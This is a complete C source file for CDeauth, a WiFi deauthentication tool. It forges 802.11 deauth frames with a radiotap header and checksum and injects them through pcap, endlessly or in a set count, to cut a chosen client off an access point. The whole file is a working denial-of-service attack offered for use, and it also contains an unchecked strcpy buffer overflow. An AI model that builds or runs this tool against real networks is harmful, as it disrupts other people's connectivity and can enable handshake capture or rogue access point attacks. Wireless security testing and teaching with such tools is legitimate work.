/**
 * CDeauth: A WiFi deauthentication tool written in C.
 * @auhor Dustin Born
 * @creationdate 2016-10-09
 * @copyright Copyright (C) by Dustin Born 2016-2019
 * @license MIT
 */

#include <arpa/inet.h>
#include <ctype.h>
#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <time.h>
#include <unistd.h>

// Constant definition
#define ETHER_ADDR_LEN 6            // length of layer 2 address
#define PACKETS_PER_INTERVAL 16     // how many packets to send per interval
#define INTERVALS_BEFORE_PRINT 4    // after how many intervals to print sent info

// structure of a full deauth packet
// see e.g. https://inst.eecs.berkeley.edu/~ee122/sp07/80211.pdf#page=29
struct ieee80211_deauth_packet {
    u_short frame_control;
    u_short duration_id;
    u_char dest_addr[ETHER_ADDR_LEN];
    u_char source_addr[ETHER_ADDR_LEN];
    u_char bssid[ETHER_ADDR_LEN];
    u_short seq_control;
    u_short reason_code;
    u_int fcs;                           // frame check sequence (CRC)
};

// static 802.11 radiotap header
static const uint8_t radiotap_header[] = {
    0x00, 0x00,                 // radiotap version + 0x00 padding
    0x19, 0x00,                 // number of bytes in our header (length)
    0x6f, 0x08, 0x00, 0x00,     // fields present (extensions)
    0x11, 0x13, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, // MAC timestamp
    0x10,                       // short guard interval
    0x02,                       // data rate
    0x6c, 0x09,                 // channel frequency
    0x80, 0x04,                 // channel flags (here: 2GHz spectrum & Dynamic CCK-OFDM)
    0xed, 0xa9, 0x00,           // (antenna signal, antenna noise, antenna)
};

// CRC table for FCS computation
const unsigned int crc_tbl[256] = {
    0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419, 0x706AF48F, 0xE963A535, 0x9E6495A3,
    0x0EDB8832, 0x79DCB8A4, 0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07, 0x90BF1D91,
    0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE, 0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7,
    0x136C9856, 0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9, 0xFA0F3D63, 0x8D080DF5,
    0x3B6E20C8, 0x4C69105E, 0xD56041E4, 0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,
    0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3, 0x45DF5C75, 0xDCD60DCF, 0xABD13D59,
    0x26D930AC, 0x51DE003A, 0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599, 0xB8BDA50F,
    0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924, 0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D,
    0x76DC4190, 0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F, 0x9FBFE4A5, 0xE8B8D433,
    0x7807C9A2, 0x0F00F934, 0x9609A88E, 0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,
    0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED, 0x1B01A57B, 0x8208F4C1, 0xF50FC457,
    0x65B0D9C6, 0x12B7E950, 0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3, 0xFBD44C65,
    0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2, 0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB,
    0x4369E96A, 0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5, 0xAA0A4C5F, 0xDD0D7CC9,
    0x5005713C, 0x270241AA, 0xBE0B1010, 0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,
    0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17, 0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD,
    0xEDB88320, 0x9ABFB3B6, 0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615, 0x73DC1683,
    0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8, 0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1,
    0xF00F9344, 0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB, 0x196C3671, 0x6E6B06E7,
    0xFED41B76, 0x89D32BE0, 0x10DA7A5A, 0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,
    0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1, 0xA6BC5767, 0x3FB506DD, 0x48B2364B,
    0xD80D2BDA, 0xAF0A1B4C, 0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF, 0x4669BE79,
    0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236, 0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F,
    0xC5BA3BBE, 0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31, 0x2CD99E8B, 0x5BDEAE1D,
    0x9B64C2B0, 0xEC63F226, 0x756AA39C, 0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,
    0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B, 0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21,
    0x86D3D2D4, 0xF1D4E242, 0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1, 0x18B74777,
    0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C, 0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45,
    0xA00AE278, 0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7, 0x4969474D, 0x3E6E77DB,
    0xAED16A4A, 0xD9D65ADC, 0x40DF0B66, 0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,
    0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605, 0xCDD70693, 0x54DE5729, 0x23D967BF,
    0xB3667A2E, 0xC4614AB8, 0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B, 0x2D02EF8D
};


/**
 * Compute the FCS / CRC of the given input packet
 */
unsigned int compute_crc(unsigned char *input, int len){
    unsigned int crc = 0xFFFFFFFF;

    for(int i = 0; i < len; i++){
        crc = crc_tbl[(crc ^ input[i]) & 0xFF] ^ (crc >> 8);
    }
    crc = ~crc;
    return crc;
}


/**
 * Convert a string representation of MAC address like AA:BB:CC:DD:EE:FF
 * to an contiguous array of 6 bytes with corresponding values.
 */
void convert_mac_string(char input_string[], uint8_t *mac){
    for(int i = 0; i < 6; i++){
        mac[i] = (char) (strtol(&input_string[i * 1 + 2 * i], NULL, 16) & 0xFF);
    }
}


/**
 * Converts a short from host byte order to little endian byte order
 */
unsigned short htoles(unsigned short value){
    // constant short to check whether host is little or big endian
    unsigned short s = 0x0001;

    // if the lower byte of s is 0x00, the host is big endian
    if(*((char *) &s) == 0x00){
        return ((value >> 8) | (value << 8));
    }
    return value;
}


/**
 * Print usage information
 */
void print_usage(char *name){
    printf("\n\n");
    printf("\tCDeauth (WiFi deauthentication in C) - (C) by Dustin Born 2016-2019 : \n\n");
    printf("\tUsage: %s [-c client] [-a access_point] [-n number]\n", name);
    printf("\t                 [-i interface] [-h]\n\n");
    printf("\t-a access point   :  MAC address of access point\n");
    printf("\t-c client         :  MAC address or target client\n");
    printf("\t-h                :  Print this help screen\n");
    printf("\t-i interface      :  The interface on which to send the packets on\n");
    printf("\t-n number         :  A integer specifying how many packets to send\n");
    printf("\t                     (-1 for unlimited)\n");
    printf("\tA client MAC, an access point MAC and an interface has to be specified.\n\n");
    printf("\tExample: ./CDeauth -c AA:BB:CC:DD:EE:FF -a FF:EE:DD:CC:BB:AA -i wlan0\n\n");
}


/**
 * Transform deauth packet data to one contiguous string to make FCS computation easier
 */
void convert_deauth_packet_to_byte_str(struct ieee80211_deauth_packet *packet, uint8_t* string) {
    string[0] = packet->frame_control & 0xFF;
    string[1] = (packet->frame_control >> 8) & 0xFF;
    string[2] = packet->duration_id & 0xFF;
    string[3] = (packet->duration_id >> 8) & 0xFF;
    
    // copy packet destination MAC address
    for (int i = 0; i < 6; i++) {
        string[4 + i] = packet->dest_addr[i];
    }
    
    // copy packet source MAC address
    for (int i = 0; i < 6; i++) {
        string[10 + i] = packet->source_addr[i];
    }

    // copy packet BSSID MAC address
    for (int i = 0; i < 6; i++) {
        string[16 + i] = packet->bssid[i];
    }

    string[22] = packet->seq_control & 0xFF;
    string[23] = (packet->seq_control >> 8) & 0xFF;
    string[24] = packet->reason_code & 0xFF;
    string[25] = (packet->reason_code >> 8) & 0xFF;
    *((uint *)(string + 26)) = packet->fcs;
}


/**
 * Prepare the static part of the deauth packets
 */
void prepare_packets(struct ieee80211_deauth_packet *packet_for_client,
                     struct ieee80211_deauth_packet *packet_for_ap) {

    // set packet field values for packet for client (802.11 is little-endian)
    packet_for_client->frame_control = 0x00C0;      // Type Deauthentication (0xc0) without any flags set (0x00)
    packet_for_client->duration_id = 0x013A;        // 314ms
    packet_for_client->seq_control = 0x0000;        // sequence number 0
    packet_for_client->reason_code = 0x0007;        // reason code 7

    // set packet field values for packet for access point (same as for client)
    packet_for_ap->frame_control = 0x00C0;
    packet_for_ap->duration_id = 0x013A;
    packet_for_ap->seq_control = 0x0000;
    packet_for_ap->reason_code = 0x0007;

    // transform certain packet fields to little endian for packet for client
    packet_for_client->frame_control = htoles(packet_for_client->frame_control);
    packet_for_client->duration_id = htoles(packet_for_client->duration_id);
    packet_for_client->seq_control = htoles(packet_for_client->seq_control);
    packet_for_client->reason_code = htoles(packet_for_client->reason_code);

    // transform certain packet fields to little endian for packet for access point
    packet_for_ap->frame_control = htoles(packet_for_ap->frame_control);
    packet_for_ap->duration_id = htoles(packet_for_ap->duration_id);
    packet_for_ap->seq_control = htoles(packet_for_ap->seq_control);
    packet_for_ap->reason_code = htoles(packet_for_ap->reason_code);

    // Set placeholder FCS
    packet_for_client->fcs = 0x00000000;
    packet_for_ap->fcs = 0x00000000;
}


/**
 * Compute and set the FCS for the given deauth packet byte string
 */
void set_fcs(uint8_t *deauth_packet_str) {
    unsigned int crc = compute_crc(deauth_packet_str, 26);
    *((uint *)(deauth_packet_str + 26)) = crc;
}


/**
 * Assign sequence control field with given sequence number
 */
void update_seq_number(uint8_t *packet, unsigned long seq_number) {
    // sequence control starts at offset 22 and is 2 bytes long
    packet[22] = (((seq_number & 0x0f) << 4) | 0x00);
    packet[23] = (((seq_number & 0xf00) >> 4) | ((seq_number & 0xf0) >> 4));
    set_fcs(packet);
}


/**
 * Send the given deauth packets the given number of times
 */
void send_deauth_packets(struct ieee80211_deauth_packet *packet_for_client,
                         struct ieee80211_deauth_packet *packet_for_ap, pcap_t *handle, long max_count) {

    // packet size and number of packets sent
    int packet_size = 30 + sizeof(radiotap_header);     // size of deauth frame and data is 30 bytes
    unsigned long packets_sent = 0;

    // create byte strings holding the final packets to send via PCAP handle
    uint8_t *packet_for_client_str = (uint8_t *) malloc(packet_size);
    uint8_t *packet_for_ap_str = (uint8_t *) malloc(packet_size);

    // fill both packet byte strings with the static data
    convert_deauth_packet_to_byte_str(packet_for_client, packet_for_client_str + sizeof(radiotap_header));
    convert_deauth_packet_to_byte_str(packet_for_ap, packet_for_ap_str + sizeof(radiotap_header));

    // put radiotap header at the beginning of the both packets
    memcpy(packet_for_client_str, radiotap_header, sizeof(radiotap_header));
    memcpy(packet_for_ap_str, radiotap_header, sizeof(radiotap_header));

    // struct for call to "nanosleep" function
    struct timespec sleep_time;

    // signal start of deauthing
    if (max_count == 0) printf("\n\n[+] Sending no packets");
    else if(max_count < 0) printf("\n\n[+] Sending packets in chunks of %d per 250ms ...\n\n", PACKETS_PER_INTERVAL);
    else if(max_count == 1) printf("\n\n[+] Sending 1 packet\n\n");
    else printf("\n\n[+] Sending %ld packets in chunks of %d per 250ms ...\n\n", max_count, PACKETS_PER_INTERVAL);

    // set up the 250ms sleep time
    sleep_time.tv_sec = 0;
    sleep_time.tv_nsec = 250000000;     // = 250 ms sleeptime

    // main packet sending loop
    while(packets_sent < max_count || max_count < 0){
        // print info after PACKETS_PER_INTERVAL * INTERVALS_BEFORE_PRINT have been sent
        if (packets_sent % (PACKETS_PER_INTERVAL * INTERVALS_BEFORE_PRINT) == 0)
            printf("    %d packets have been sent ...\n", (PACKETS_PER_INTERVAL * INTERVALS_BEFORE_PRINT));

        // sleep / pause after PACKETS_PER_INTERVAL packets
        if (packets_sent % PACKETS_PER_INTERVAL == 0)
            nanosleep(&sleep_time, NULL);

        // put correct sequence number and recompute FCS
        update_seq_number(packet_for_client_str + sizeof(radiotap_header), packets_sent);
        update_seq_number(packet_for_ap_str + sizeof(radiotap_header), packets_sent);

        // send one deauth packet to client and one to AP
        pcap_inject(handle, packet_for_client_str, packet_size);
        pcap_inject(handle, packet_for_ap_str, packet_size);

        packets_sent++;
    }
    printf("\n[+] All packets have been sent\n\n\n");

    // free previously allocated memory
    free(packet_for_client_str);
    free(packet_for_ap_str);
}


/**
 * Main function that sets up the client and AP deauth packets and sends them
 */
int main(int argc, char *argv[]){
    char interface[25];

    // argument handling
    long number_of_packets = -1, args_iface = 0, args_ap_mac = 0, args_c_mac = 0;

    // definitiion of the client and AP packet pointers
    struct ieee80211_deauth_packet packet_for_client = {}, packet_for_ap = {};

    /** process program parameters, namely client MAC, AP MAC and number of packets to send **/
    if(argc < 6 || argc > 9){
        print_usage(argv[0]);
        return 0;
    }

    for(int i = 1; i < argc; i++){
        // AP MAC
        if(strcmp(argv[i], "-a") == 0){
            convert_mac_string(argv[i + 1], packet_for_client.source_addr);
            convert_mac_string(argv[i + 1], packet_for_client.bssid);
            convert_mac_string(argv[i + 1], packet_for_ap.dest_addr);
            convert_mac_string(argv[i + 1], packet_for_ap.bssid);
            args_ap_mac = 1;
            i++;
        }
        // client MAC
        else if(strcmp(argv[i], "-c") == 0){
            convert_mac_string(argv[i + 1], packet_for_client.dest_addr);
            convert_mac_string(argv[i + 1], packet_for_ap.source_addr);
            args_c_mac = 1;
            i++;
        }
        // interface name
        else if(strcmp(argv[i], "-i") == 0){
            strcpy(interface, argv[i + 1]);
            args_iface = 1;
            i++;
        }
        // number of packets to send
        else if(strcmp(argv[i], "-n") == 0){
            number_of_packets = strtol(argv[i + 1], NULL, 10);
            i++;
        }
        // print usage inf
        else if(strcmp(argv[i], "-h") == 0){
            print_usage(argv[0]);
            return 0;
        }
    }

    if (!args_iface || !args_c_mac || !args_ap_mac) {
        print_usage(argv[0]);
        return 1;
    }

    // fill the packets with available static data
    prepare_packets(&packet_for_client, &packet_for_ap);

    // initialize PCAP handle
    char errbuf[100];
    // Doc: https://www.tcpdump.org/manpages/pcap_open_live.3pcap.html
    pcap_t *handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        printf("Error when opening PCAP handle: %s\n", errbuf);
        return 1;
    }

    send_deauth_packets(&packet_for_client, &packet_for_ap, handle, number_of_packets);

    pcap_close(handle);

    return 0;
}
